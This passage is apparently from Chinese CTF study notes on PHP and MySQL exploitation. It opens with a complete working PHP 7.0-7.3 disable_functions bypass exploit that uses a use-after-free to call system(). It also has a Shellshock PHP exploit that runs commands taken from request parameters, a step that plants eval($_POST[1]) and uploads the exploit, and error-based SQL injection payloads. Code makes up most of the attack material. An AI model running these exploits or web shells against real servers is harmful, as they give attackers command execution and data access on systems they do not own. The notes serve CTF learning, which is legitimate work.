class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在可以连接的情况下，将poc上传到<code>/tmp/</code> 目录下，然后包含他。</p><p>比如 GKCTF2020 Checkin ，GYCTF2020 EasyThink也是 一样的bypass思路。先是<code>Ginkgo=eval($_POST[1]);</code> 然后AS连上后，在<code>/tmp/</code>目录上上传exp。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231323.png"></p><h4 id="LD-PRELOAD-劫持"><a href="#LD-PRELOAD-劫持" class="headerlink" title="LD_PRELOAD 劫持"></a>LD_PRELOAD 劫持</h4><blockquote><p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so</p></blockquote><h4 id="ImageMagick-vuln-bypass"><a href="#ImageMagick-vuln-bypass" class="headerlink" title="ImageMagick vuln bypass"></a>ImageMagick vuln bypass</h4><p>也就是<strong>利用存在漏洞的组件，扩展。</strong></p><h4 id="Mod-cgi"><a href="#Mod-cgi" class="headerlink" title="Mod_cgi"></a>Mod_cgi</h4><blockquote><p>修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通i信</p></blockquote><h4 id="Windows-系统组件-COM"><a href="#Windows-系统组件-COM" class="headerlink" title="Windows 系统组件 COM"></a>Windows 系统组件 COM</h4><p>在<code>c:/System32/</code> 下的一个<code>wshom.ocx</code> 文件。</p><h4 id="PHP-7-4-FFI-Bypass"><a href="#PHP-7-4-FFI-Bypass" class="headerlink" title="PHP 7.4 FFI Bypass"></a>PHP 7.4 FFI Bypass</h4><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p></blockquote><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><p>需要满足：</p><ol><li><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。</li><li><code>FFI support = enable</code>。</li></ol><p>例题：[RCTF 2019]Nextphp</p><p><a href="https://hack-for.fun/posts/38da.html">https://hack-for.fun/posts/38da.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527134039.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231206.png"></p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI</a></p><h4 id="Bash-ShellShock"><a href="#Bash-ShellShock" class="headerlink" title="Bash ShellShock"></a>Bash ShellShock</h4><p>利用方法的前提是目标 OS 存在 Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考: <a href="https://www.freebuf.com/news/48331.html">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527135528.png"></p><p><strong>Bash 破壳漏洞成因</strong>：目前的 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 <code>()&#123;</code> 开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>好像AntSword 虚拟终端已经将这个漏洞作为默认使用了。</p><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params">$cmd</span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="寻找漏网之鱼"><a href="#寻找漏网之鱼" class="headerlink" title="寻找漏网之鱼"></a>寻找漏网之鱼</h4><p>…自行领会。</p><hr><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><h2 id="XXE-PHP-7-0-30"><a href="#XXE-PHP-7-0-30" class="headerlink" title="XXE - PHP 7.0.30"></a>XXE - PHP 7.0.30</h2><ul><li>Php 7.0.30</li><li>Libxml 2.8.0</li></ul><p><strong>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</strong></p><ul><li>SimpleXMLElement</li><li>loadXML</li><li>simplexml_load_string</li></ul><h2 id="unserialize-serialize"><a href="#unserialize-serialize" class="headerlink" title="unserialize/serialize"></a>unserialize/serialize</h2><ul><li><p>php 7.1.x～7.3.x（具体不知，php7.x 好像都可以，遇到时，试一下就可以。</p><p>对属性类型不敏感，可直接将属性改为public，减轻编写payload的负担。</p></li><li><p>php &lt; 5.6.25 &amp;&amp; php &lt; 7.0.10</p></li></ul><p><code>__wakeup</code> 可绕过。绕过方法：当对象属性个数大于真实属性个数时。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>不同版本的mysql 主要在”高级“ 注入情况下，</p><p><a href="https://xz.aliyun.com/t/7169#toc-3">https://xz.aliyun.com/t/7169#toc-3</a> 。 膜一波Yunen师傅。</p><h3 id="Mysql-lt-5-0-面试常问"><a href="#Mysql-lt-5-0-面试常问" class="headerlink" title="Mysql &lt; 5.0(面试常问)"></a>Mysql &lt; 5.0(面试常问)</h3><p>由于mysql的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠<strong>猜</strong>来解决。</p><p>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p><p>若知道仅表名而不知道列(字段)名：</p><p>可通过以下payload：</p><ul><li>若多字段：select <code>x</code> from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>若单字段：select *,1,2,xxx from table_name</li></ul><h3 id="Mysql-gt-5-0（面试常问"><a href="#Mysql-gt-5-0（面试常问" class="headerlink" title="Mysql &gt;= 5.0（面试常问"></a>Mysql &gt;= 5.0（面试常问</h3><p>首先去一个名为<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong>。</p><p>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</p><p>在information_schema的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。</p><p>其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p><p>接着通过其表名，查询该表的所有字段名，有时也称列名。</p><p>通过information_schema库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p><blockquote><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表<br>名；5.0以下是多用户单操作，5.0以上是多用户多操做。</p></blockquote><h3 id="exp-pow-报错注入"><a href="#exp-pow-报错注入" class="headerlink" title="exp()/pow() 报错注入"></a>exp()/pow() 报错注入</h3><p>Mysql 5.5.5~5.5.49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select exp(3);</span><br><span class="line">+--------------------+</span><br><span class="line">| exp(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select exp(999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select pow(9,99);</span><br><span class="line">+-----------------------+</span><br><span class="line">| pow(9,99)             |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 2.9512665430652752e94 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select pow(9,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(9,999)&#39;</span><br></pre></td></tr></table></figure><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml() 报错注入"></a>updatexml() 报错注入</h3><p>Mysql 5.1.5+</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul><li><code>file_priv</code> 用户的文件读写权限。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER 